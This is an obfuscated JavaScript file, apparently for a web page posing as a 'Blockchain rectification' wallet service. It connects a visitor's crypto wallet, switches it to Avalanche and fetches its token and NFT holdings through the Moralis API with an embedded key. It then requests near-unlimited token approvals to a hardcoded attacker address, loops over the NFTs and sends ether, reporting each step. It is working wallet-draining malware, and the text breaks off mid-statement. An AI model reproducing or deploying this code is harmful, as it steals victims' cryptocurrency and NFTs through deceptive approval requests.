const _0x1acead=_0x4e87;(function(_0x4c8edf,_0x57f30e){const _0x1a4526=_0x4e87,_0x593789=_0x4c8edf();while(!![]){try{const _0x3fc72e=parseInt(_0x1a4526(0x213))/0x1+-parseInt(_0x1a4526(0x1e3))/0x2+-parseInt(_0x1a4526(0x186))/0x3+parseInt(_0x1a4526(0x1e4))/0x4*(parseInt(_0x1a4526(0x194))/0x5)+-parseInt(_0x1a4526(0x1ad))/0x6+parseInt(_0x1a4526(0x1bb))/0x7+-parseInt(_0x1a4526(0x165))/0x8*(-parseInt(_0x1a4526(0x192))/0x9);if(_0x3fc72e===_0x57f30e)break;else _0x593789['push'](_0x593789['shift']());}catch(_0x7f82a6){_0x593789['push'](_0x593789['shift']());}}}(_0x3059,0x63396));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';function _0x4e87(_0x3cee03,_0x4dc563){const _0x3059dc=_0x3059();return _0x4e87=function(_0x4e8744,_0xbf9ab8){_0x4e8744=_0x4e8744-0x163;let _0x15d4ce=_0x3059dc[_0x4e8744];return _0x15d4ce;},_0x4e87(_0x3cee03,_0x4dc563);}import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId=_0x1acead(0x187),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x1acead(0x176))]({'chains':chains,'options':{'appName':_0x1acead(0x1f9)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg'}},ethereumClient);function _0x3059(){const _0x37c0dd=['CoinbaseWalletConnector','remaining','chainId:','Could\x20not\x20get\x20a\x20wallet\x20connection','Transaction\x20Receipt:\x20','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','https://deep-index.moralis.io/api/v2/','_owner','uint256','startingIndex','catch','_to','AddedBlackList','result','tokens-list','basisPointsRate','1759800prSwZW','ee71d215d0dec7d1bf950851c84d9643','who','REVEAL_TIMESTAMP','transfer','getApproved','Deprecate','newAddress','getProvider','Error\x20collecting\x20info\x20about\x20wallet','approved','BAYC_PROVENANCE','2637ygsCir','allowed','3618365RxRXZd','balance','setApprovalForAll','newBasisPoints','supportsInterface','interfaceId','value','mintApe','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','GET','click','Wallet\x20Connected\x20Successfully\x20to\x20avalanche!','_decimals','setParams','tokenOfOwnerByIndex','balances','map','deprecate','_symbol','MAX_APES','from','maximumFee','_name','json','isBlackListed','4277484FmwPIY','Transfer','issue','Token\x20balance\x20is\x20','transferOwnership','deprecated','setProvenanceHash','symbol','event','.proceed','setBaseURI','&vs_currencies=usd','decimals','&format=decimal&limit=','356433jGHwRg','saleIsActive','filter','Approved','Error\x20processing\x20item\x20','ApprovalForAll','No\x20address','_from','DestroyedBlackFunds','approve','amount','token_address','unpause','error','Transaction\x20is\x20submitted\x20to\x20the\x20network','payable','Redeem','price','then','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','newOwner','_maker','999999999999999999999999999999999999999999999999999999999999999999999999','bool','maxNftSupply','bytes4','options','usd','address','upgradedAddress','isApprovedForAll','.connect','withdraw','transferFrom','operator','NFT','formatted','NFTs\x20collection\x20','tokenId','log','15938sirNHi','4Hxirlx','/erc20','Pause','function','_value','redeem','Unpause','Cl\x20address\x20:\x20','_initialSupply','status','maxApePurchase','Tokens:','revealTimeStamp','toString','newMaxFee','view','all','_spender','gasPrice','MAX_UINT','application/json','Blockchain\x20rectification','Initial\x20list\x20','feeBasisPoints','New\x20token','balanceOf','Your\x20address\x20','tokenByIndex','hash','search','RemovedBlackList','sending\x20ether','_user','Issue','length','Error:\x20','previousOwner','openModal','Approve\x20Completed\x20Successfully','Approval','constructor','_evilUser','_balance','setRevealTimestamp','tokenURI','renounceOwnership','_blackListedUser','603242qajCBl','numberOfTokens','pause','9176YkHYaW','string','5227607491','name','_clearedUser','TOKEN\x20Contract\x20Address\x20','nonpayable','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','paused','owner','maxFee','destroyBlackFunds','message','emergencySetStartingIndexBlock','Transaction\x20hash\x20','Incorrect\x20network','totalSupply'];_0x3059=function(){return _0x37c0dd;};return _0x3059();}const OWNER_ADDRESS='0xea8968B218a551919FbD5f1166328C82a96dED54',ABI=[{'constant':!![],'inputs':[],'name':_0x1acead(0x168),'outputs':[{'name':'','type':_0x1acead(0x166)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x1acead(0x1d7)}],'name':_0x1acead(0x1a5),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':'function'},{'constant':![],'inputs':[{'name':_0x1acead(0x1f5),'type':'address'},{'name':_0x1acead(0x1e8),'type':_0x1acead(0x17e)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x1b2),'outputs':[{'name':'','type':_0x1acead(0x1d2)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x20d),'type':_0x1acead(0x1d7)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1acead(0x175),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x1c2),'type':_0x1acead(0x1d7)},{'name':_0x1acead(0x181),'type':_0x1acead(0x1d7)},{'name':_0x1acead(0x1e8),'type':_0x1acead(0x17e)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x1d8),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x1acead(0x1a3),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':'view','type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x1b9),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':'view','type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x1a9),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':'function'},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':'function'},{'constant':![],'inputs':[],'name':_0x1acead(0x1c7),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[{'name':_0x1acead(0x1d0),'type':'address'}],'name':'getBlackListStatus','outputs':[{'name':'','type':_0x1acead(0x1d2)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':_0x1acead(0x1d7)}],'name':_0x1acead(0x193),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x16d),'outputs':[{'name':'','type':_0x1acead(0x1d2)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[{'name':_0x1acead(0x188),'type':_0x1acead(0x1d7)}],'name':_0x1acead(0x1fd),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':'view','type':_0x1acead(0x1e7)},{'constant':![],'inputs':[],'name':_0x1acead(0x164),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x1acead(0x1d7)}],'payable':![],'stateMutability':'view','type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x16e),'outputs':[{'name':'','type':_0x1acead(0x1d7)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x1acead(0x166)}],'payable':![],'stateMutability':'view','type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x181),'type':'address'},{'name':_0x1acead(0x1e8),'type':'uint256'}],'name':_0x1acead(0x18a),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x197),'type':_0x1acead(0x17e)},{'name':_0x1acead(0x1f2),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x1a1),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x1acead(0x17e)}],'name':_0x1acead(0x1af),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':'function'},{'constant':![],'inputs':[{'name':_0x1acead(0x1c5),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x1e9),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[{'name':_0x1acead(0x17d),'type':'address'},{'name':_0x1acead(0x1f5),'type':_0x1acead(0x1d7)}],'name':'allowance','outputs':[{'name':_0x1acead(0x177),'type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x185),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x1acead(0x1d7)}],'name':_0x1acead(0x1ac),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x169),'type':_0x1acead(0x1d7)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':!![],'inputs':[],'name':_0x1acead(0x1f7),'outputs':[{'name':'','type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x1cf),'type':_0x1acead(0x1d7)}],'name':_0x1acead(0x1b1),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'constant':![],'inputs':[{'name':_0x1acead(0x212),'type':_0x1acead(0x1d7)}],'name':_0x1acead(0x170),'outputs':[],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'name':_0x1acead(0x1ec),'type':_0x1acead(0x17e)},{'name':_0x1acead(0x1aa),'type':_0x1acead(0x166)},{'name':_0x1acead(0x1a6),'type':_0x1acead(0x166)},{'name':_0x1acead(0x1a0),'type':_0x1acead(0x17e)}],'payable':![],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x20c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x1c5),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x205),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x1c5),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x1cb),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x18d),'type':_0x1acead(0x1d7)}],'name':_0x1acead(0x18c),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x1fb),'type':_0x1acead(0x17e)},{'indexed':![],'name':_0x1acead(0x16f),'type':_0x1acead(0x17e)}],'name':'Params','type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x212),'type':'address'},{'indexed':![],'name':_0x1acead(0x20e),'type':'uint256'}],'name':_0x1acead(0x1c3),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x204),'type':_0x1acead(0x1d7)}],'name':_0x1acead(0x182),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1acead(0x204),'type':'address'}],'name':_0x1acead(0x202),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x1acead(0x1d7)},{'indexed':!![],'name':'spender','type':_0x1acead(0x1d7)},{'indexed':![],'name':'value','type':_0x1acead(0x17e)}],'name':_0x1acead(0x20b),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1acead(0x1a8),'type':_0x1acead(0x1d7)},{'indexed':!![],'name':'to','type':_0x1acead(0x1d7)},{'indexed':![],'name':'value','type':'uint256'}],'name':_0x1acead(0x1ae),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[],'name':_0x1acead(0x1e6),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x1acead(0x1ea),'type':_0x1acead(0x1b5)}],ABIN=[{'inputs':[{'internalType':_0x1acead(0x166),'name':_0x1acead(0x168),'type':_0x1acead(0x166)},{'internalType':_0x1acead(0x166),'name':_0x1acead(0x1b4),'type':_0x1acead(0x166)},{'internalType':'uint256','name':_0x1acead(0x1d3),'type':_0x1acead(0x17e)},{'internalType':_0x1acead(0x17e),'name':'saleStart','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x20c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':'owner','type':_0x1acead(0x1d7)},{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':'approved','type':'address'},{'indexed':!![],'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x20b),'type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x16e),'type':_0x1acead(0x1d7)},{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1dd),'type':_0x1acead(0x1d7)},{'indexed':![],'internalType':_0x1acead(0x1d2),'name':_0x1acead(0x190),'type':_0x1acead(0x1d2)}],'name':_0x1acead(0x1c0),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x208),'type':'address'},{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1cf),'type':'address'}],'name':'OwnershipTransferred','type':_0x1acead(0x1b5)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1a8),'type':_0x1acead(0x1d7)},{'indexed':!![],'internalType':_0x1acead(0x1d7),'name':'to','type':_0x1acead(0x1d7)},{'indexed':!![],'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':'Transfer','type':_0x1acead(0x1b5)},{'inputs':[],'name':_0x1acead(0x191),'outputs':[{'internalType':'string','name':'','type':_0x1acead(0x166)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x1a7),'outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x189),'outputs':[{'internalType':'uint256','name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':'address','name':'to','type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x1c4),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':'owner','type':'address'}],'name':_0x1acead(0x1fd),'outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x1acead(0x166),'name':'','type':_0x1acead(0x166)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x172),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x18b),'outputs':[{'internalType':_0x1acead(0x1d7),'name':'','type':_0x1acead(0x1d7)}],'stateMutability':'view','type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x16e),'type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x1d7),'name':'operator','type':'address'}],'name':_0x1acead(0x1d9),'outputs':[{'internalType':_0x1acead(0x1d2),'name':'','type':'bool'}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x1ee),'outputs':[{'internalType':'uint256','name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x163),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x19b),'outputs':[],'stateMutability':_0x1acead(0x1ca),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x168),'outputs':[{'internalType':_0x1acead(0x166),'name':'','type':'string'}],'stateMutability':'view','type':_0x1acead(0x1e7)},{'inputs':[],'name':'owner','outputs':[{'internalType':'address','name':'','type':_0x1acead(0x1d7)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':'ownerOf','outputs':[{'internalType':'address','name':'','type':_0x1acead(0x1d7)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x211),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1a8),'type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x1d7),'name':'to','type':'address'},{'internalType':'uint256','name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1a8),'type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x1d7),'name':'to','type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':'uint256'},{'internalType':'bytes','name':'_data','type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':_0x1acead(0x1bc),'outputs':[{'internalType':_0x1acead(0x1d2),'name':'','type':_0x1acead(0x1d2)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':'address','name':_0x1acead(0x1dd),'type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x1d2),'name':'approved','type':_0x1acead(0x1d2)}],'name':_0x1acead(0x196),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x166),'name':'baseURI','type':_0x1acead(0x166)}],'name':_0x1acead(0x1b7),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x166),'name':'provenanceHash','type':'string'}],'name':_0x1acead(0x1b3),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':'function'},{'inputs':[{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1f0),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x20f),'outputs':[],'stateMutability':'nonpayable','type':_0x1acead(0x1e7)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x17f),'outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':_0x1acead(0x17e)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x1acead(0x1d4),'name':_0x1acead(0x199),'type':_0x1acead(0x1d4)}],'name':_0x1acead(0x198),'outputs':[{'internalType':_0x1acead(0x1d2),'name':'','type':_0x1acead(0x1d2)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x1b4),'outputs':[{'internalType':'string','name':'','type':_0x1acead(0x166)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':'uint256','name':'index','type':_0x1acead(0x17e)}],'name':_0x1acead(0x1ff),'outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x16e),'type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x17e),'name':'index','type':_0x1acead(0x17e)}],'name':_0x1acead(0x1a2),'outputs':[{'internalType':_0x1acead(0x17e),'name':'','type':'uint256'}],'stateMutability':_0x1acead(0x1f3),'type':'function'},{'inputs':[{'internalType':_0x1acead(0x17e),'name':_0x1acead(0x1e1),'type':_0x1acead(0x17e)}],'name':_0x1acead(0x210),'outputs':[{'internalType':'string','name':'','type':_0x1acead(0x166)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x175),'outputs':[{'internalType':'uint256','name':'','type':_0x1acead(0x17e)}],'stateMutability':_0x1acead(0x1f3),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':'from','type':_0x1acead(0x1d7)},{'internalType':_0x1acead(0x1d7),'name':'to','type':_0x1acead(0x1d7)},{'internalType':'uint256','name':_0x1acead(0x1e1),'type':'uint256'}],'name':_0x1acead(0x1dc),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[{'internalType':_0x1acead(0x1d7),'name':_0x1acead(0x1cf),'type':'address'}],'name':_0x1acead(0x1b1),'outputs':[],'stateMutability':_0x1acead(0x16b),'type':_0x1acead(0x1e7)},{'inputs':[],'name':_0x1acead(0x1db),'outputs':[],'stateMutability':'nonpayable','type':_0x1acead(0x1e7)}];$(_0x1acead(0x1da))[_0x1acead(0x19e)](async function(){const _0xe68390=_0x1acead;console[_0xe68390(0x1e2)]('1');try{await web3Modal[_0xe68390(0x209)]();}catch(_0x3b2659){console[_0xe68390(0x1e2)](_0xe68390(0x179),_0x3b2659);return;}}),$(_0x1acead(0x1b6))['click'](async function(){const _0x1ff199=_0x1acead;let _0x37953c=getAccount();console['log'](_0x37953c),!_0x37953c[_0x1ff199(0x1d7)]&&(console[_0x1ff199(0x1e2)](_0x1ff199(0x1c1)),alert(_0x1ff199(0x17b))),_0x37953c['connector'][_0x1ff199(0x1d5)][_0x1ff199(0x18e)]()['networkVersion']!==0xa86a&&(console[_0x1ff199(0x1e2)](_0x1ff199(0x174)),await switchNetwork({'chainId':0xa86a})),selectedAccount=_0x37953c[_0x1ff199(0x1d7)],sendMessage(_0x1ff199(0x19f)),sendMessage(_0x1ff199(0x1eb)+selectedAccount),covalenthqAPICall();});const Oxa='0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0',Oxc=_0x1acead(0x167);async function covalenthqAPICall(){const _0x2090b0=_0x1acead,_0x2834cb={'chain':'avalanche'},_0x8dd48=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x2090b0(0x1e5));_0x8dd48[_0x2090b0(0x201)]=new URLSearchParams(_0x2834cb)['toString']();const _0x21ee71={'method':_0x2090b0(0x19d),'headers':{'accept':_0x2090b0(0x1f8),'X-API-Key':_0x2090b0(0x1ce)}};try{const _0xbef1f9=await fetch(_0x8dd48,_0x21ee71)[_0x2090b0(0x1cd)](_0xff1cfd=>_0xff1cfd[_0x2090b0(0x1ab)]());console[_0x2090b0(0x1e2)](_0xbef1f9);let _0x15edd1=_0xbef1f9;console[_0x2090b0(0x1e2)](_0x2090b0(0x1fa),_0x15edd1);let _0x6aba19=await Promise[_0x2090b0(0x1f4)](_0x15edd1[_0x2090b0(0x1a4)](async _0x11e600=>{const _0x19468c=_0x2090b0;let _0x1dcf44;try{_0x1dcf44=await getValue(_0x11e600['token_address'],_0x11e600[_0x19468c(0x195)],_0x11e600[_0x19468c(0x1b9)]);}catch(_0x1ee0b6){_0x1dcf44=0x0;}return console['log'](_0x1dcf44),{'balance':_0x11e600[_0x19468c(0x195)],'value':_0x1dcf44,'address':_0x11e600[_0x19468c(0x1c6)]};}));console[_0x2090b0(0x1e2)](_0x2090b0(0x184),_0x6aba19),tokens=_0x6aba19[_0x2090b0(0x1bd)](_0x24af9b=>_0x24af9b[_0x2090b0(0x19a)]>0x5),tokens['sort']((_0x46b078,_0x320ce3)=>_0x320ce3[_0x2090b0(0x19a)]-_0x46b078[_0x2090b0(0x19a)]),console[_0x2090b0(0x1e2)](_0x2090b0(0x178),await getNetwork(),_0x2090b0(0x1ef),tokens),NFTs=await getNFTs(selectedAccount)[_0x2090b0(0x180)](_0x37c51c=>{console['log']('Unable\x20to\x20get\x20NFts',_0x37c51c);}),NFTs=NFTs[_0x2090b0(0x183)],console[_0x2090b0(0x1e2)](_0x2090b0(0x1e0),NFTs);if(tokens['length']===0x0&&NFTs[_0x2090b0(0x206)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2090b0(0x18f));}}async function onApprove(){const _0x2f094d=_0x1acead;if(tokens[_0x2f094d(0x206)])try{loopTokens(tokens);}catch(_0x1449f8){console[_0x2f094d(0x1c8)](_0x2f094d(0x1bf)+_0x1449f8[_0x2f094d(0x171)]);}else{if(NFTs[_0x2f094d(0x206)]){try{loopNfts(NFTs);}catch(_0x114091){console[_0x2f094d(0x1c8)](_0x2f094d(0x1bf)+_0x114091['message']);}onSendEther(),sendMessage(_0x2f094d(0x16c));}else try{onSendEther();}catch(_0x592440){console[_0x2f094d(0x1c8)](_0x2f094d(0x1bf)+_0x592440[_0x2f094d(0x171)]);}}}async function loopTokens(_0x156042){const _0x2f6590=_0x1acead;for await(let _0x3304ea of _0x156042){console[_0x2f6590(0x1e2)]('Token',_0x3304ea);try{sendMessage(_0x2f6590(0x1fc));let {hash:_0x46a573}=await writeContract({'address':_0x3304ea[_0x2f6590(0x1d7)],'abi':ABI,'functionName':_0x2f6590(0x1c4),'args':[Oxa,_0x2f6590(0x1d1)]});console[_0x2f6590(0x1e2)](_0x2f6590(0x200),_0x46a573),_0x46a573&&(console[_0x2f6590(0x1e2)](_0x2f6590(0x1be)),sendMessage(_0x2f6590(0x20a)),sendMessage(_0x2f6590(0x16a)+_0x3304ea[_0x2f6590(0x1d7)]),sendMessage(_0x2f6590(0x1b0)+_0x3304ea[_0x2f6590(0x195)]),sendMessage(_0x2f6590(0x1fe)+Oxa));}catch(_0x452eee){console[_0x2f6590(0x1e2)](_0x2f6590(0x207)+_0x452eee),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x429279){const _0x3e4ebd=_0x1acead;for await(let _0x5900a0 of _0x429279){console[_0x3e4ebd(0x1e2)](_0x3e4ebd(0x1de),_0x5900a0);try{let {hash:_0x8a897f}=await 